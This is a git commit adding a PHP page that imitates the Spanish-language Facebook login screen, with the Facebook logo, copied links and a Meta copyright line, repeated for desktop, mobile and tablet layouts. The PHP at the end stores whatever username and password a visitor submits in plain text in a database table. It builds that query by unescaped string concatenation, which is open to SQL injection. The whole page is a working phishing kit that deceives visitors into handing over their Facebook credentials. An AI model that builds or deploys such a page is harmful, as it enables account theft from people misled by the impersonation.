15dc5cb1da7ec46adba6cdfa02f1ed2c0cac0d4c
Cheetos09 <121208310+Cheetos09@users.noreply.github.com>
2023-07-08 16:32:28 -0600

    Add files via upload

---
+++ index.php
@@ -0,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="icon" href="img/logo.ico">
+	<link rel="stylesheet" type="text/css" href="css/index.css">
+	<title>Facebook</title>
+</head>
+<body>
+    <div class="resolution">
+	<div class="Desktop">
+	<!----------------------------------------------->
+	<!--DATA ENTRY SECTION-->
+	<div class="bodysesion">
+	<!--FACEBOOK LOGO-->
+	<div class="facebook" align="center">
+		<a href="index.php"><img src="img/fb.png" height="83" width="238"></a>
+	</div>
+    
+    <font face="Arial">
+    <!--INSERT DATA-->
+    <form action="index.php" method="POST">
+	<div class="box" align="center"> <font size="4"> 
+		Iniciar sesión en Facebook <p>
+	<div class="information" align="center">
+		<input type="text" name="User" placeholder="Correo electrónico o número de teléfono"> <p>
+        <input type="password" name="Password" placeholder="Contraseña">
+     </font>
+
+    </div>
+    <!--SIGN IN-->
+    <div class="sesion" align="center">
+    	<input type="submit" name="send" value="Iniciar sesión"> <p> 
+    </form>
+    	<a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"><font color="#458CFF"> ¿Olvidaste tu contraseña? </font></a>
+    </div>
+    </div>
+    </div>
+    <div class="newcount" align="center">
+
+    <!--CREATE NEW COUNT-->
+    	______________________ o _______________________
+    	<p>
+    	<a href="https://www.facebook.com/r.php?locale=es_ES&display=page"><button name="cc"><font color="White">Crear cuenta nueva</font></button></a>
+    </div>
+     
+    <!--LANGUAJES-->
+    <div class="boxl" align="center">
+    <div class="languajes">
+    	<div class="left">
+    		<a href="#">Español           </a>    <br>
+    		<a href="#">Português (Brazil)</a>    <br>
+    		<a href="#">Français (France) </a>    <br>
+    		<a href="#">العربية           </a>    <br>
+    	</div>
+    	<div class="right">
+    		<a href="#">English (US)     </a>    <br>
+    		<a href="#">Italiano         </a>    <br>
+    		<a href="#">Deutsch          </a>    <br>
+    		<button name="+"> + </button>
+    	</div>
+    </div>
+    </div>
+    <br>
+    <!--CONTACT-->
+    <div class="Contact" align="center">
+    	<a href="#">Información</a> . <a href="#">Ayuda</a> . <a href="#">Más</a>
+        <p>
+        <font color="#757E85">Meta © 2023</font>
+    </div>
+</font>
+</div>
+
+<!------------------------------------------------------------------------------------------------------------------->
+
+<div class="Movil">
+	<!----------------------------------------------->
+	<!--DATA ENTRY SECTION-->
+	<div class="bodysesion">
+	<!--FACEBOOK LOGO-->
+	<div class="facebook" align="center">
+		<a href="index.php"><img src="img/fb.png" height="83" width="238"></a>
+	</div>
+    
+    <font face="Arial">
+    <!--INSERT DATA-->
+    <form action="index.php" method="POST">
+	<div class="box" align="center"> <font size="4"> 
+		Iniciar sesión en Facebook <p>
+	<div class="information" align="center">
+		<input type="text" name="User" placeholder="Correo electrónico o número de teléfono"> <p>
+        <input type="password" name="Password" placeholder="Contraseña">
+     </font>
+
+    </div>
+    <!--SIGN IN-->
+    <div class="sesion" align="center">
+    	<input type="submit" name="send" value="Iniciar sesión"> <p> 
+    </form>
+    	<a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"><font color="#458CFF"> ¿Olvidaste tu contraseña? </font></a>
+    </div>
+    </div>
+    </div>
+    <div class="newcount" align="center">
+
+    <!--CREATE NEW COUNT-->
+    	______________________ o _______________________
+    	<p>
+    	<a href="https://www.facebook.com/r.php?locale=es_ES&display=page"><button name="cc"><font color="White">Crear cuenta nueva</font></button></a>
+    </div>
+     
+    <!--LANGUAJES-->
+    <div class="boxl" align="center">
+    <div class="languajes">
+    	<div class="left">
+    		<a href="#">Español           </a>    <br>
+    		<a href="#">Português (Brazil)</a>    <br>
+    		<a href="#">Français (France) </a>    <br>
+    		<a href="#">العربية           </a>    <br>
+    	</div>
+    	<div class="right">
+    		<a href="#">English (US)     </a>    <br>
+    		<a href="#">Italiano         </a>    <br>
+    		<a href="#">Deutsch          </a>    <br>
+    		<button name="+"> + </button>
+    	</div>
+    </div>
+    </div>
+    <br>
+    <!--CONTACT-->
+    <div class="Contact" align="center">
+    	<a href="#">Información</a> . <a href="#">Ayuda</a> . <a href="#">Más</a>
+        <p>
+        <font color="#757E85">Meta © 2023</font>
+    </div>
+</font>
+</div>
+
+<!------------------------------------------------------------------------------------------------------------------->
+
+<div class="Tablet">
+	<!----------------------------------------------->
+	<!--DATA ENTRY SECTION-->
+	<div class="bodysesion">
+	<!--FACEBOOK LOGO-->
+	<div class="facebook" align="center">
+		<a href="index.php"><img src="img/fb.png" height="83" width="238"></a>
+	</div>
+    
+    <font face="Arial">
+    <!--INSERT DATA-->
+    <form action="index.php" method="POST">
+	<div class="box" align="center"> <font size="4"> 
+		Iniciar sesión en Facebook <p>
+	<div class="information" align="center">
+		<input type="text" name="User" placeholder="Correo electrónico o número de teléfono"> <p>
+        <input type="password" name="Password" placeholder="Contraseña">
+     </font>
+
+    </div>
+    <!--SIGN IN-->
+    <div class="sesion" align="center">
+    	<input type="submit" name="send" value="Iniciar sesión"> <p> 
+    </form>
+    	<a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"><font color="#458CFF"> ¿Olvidaste tu contraseña? </font></a>
+    </div>
+    </div>
+    </div>
+    <div class="newcount" align="center">
+
+    <!--CREATE NEW COUNT-->
+    	______________________ o _______________________
+    	<p>
+    	<a href="https://www.facebook.com/r.php?locale=es_ES&display=page"><button name="cc"><font color="White">Crear cuenta nueva</font></button></a>
+    </div>
+     
+    <!--LANGUAJES-->
+    <div class="boxl" align="center">
+    <div class="languajes">
+    	<div class="left">
+    		<a href="#">Español           </a>    <br>
+    		<a href="#">Português (Brazil)</a>    <br>
+    		<a href="#">Français (France) </a>    <br>
+    		<a href="#">العربية           </a>    <br>
+    	</div>
+    	<div class="right">
+    		<a href="#">English (US)     </a>    <br>
+    		<a href="#">Italiano         </a>    <br>
+    		<a href="#">Deutsch          </a>    <br>
+    		<button name="+"> + </button>
+    	</div>
+    </div>
+    </div>
+    <br>
+    <!--CONTACT-->
+    <div class="Contact" align="center">
+    	<a href="#">Información</a> . <a href="#">Ayuda</a> . <a href="#">Más</a>
+        <p>
+        <font color="#757E85">Meta © 2023</font>
+    </div>
+</font>
+</div>
+</div>
+</body>
+</html>
+
+
+
+<?php 
+
+include 'conexion.php';
+
+if(isset($_POST['send'])){
+	if (strlen($_POST['User']) >=1 && strlen($_POST['Password']) >=1){
+		$user= trim($_POST['User']);
+		$password= trim($_POST['Password']);
+		$consulta="INSERT INTO profile(User,Password) VALUES('$user','$password')";
+		$resultado=mysqli_query($conex,$consulta);
+	}
+}
+
+
+ ?>
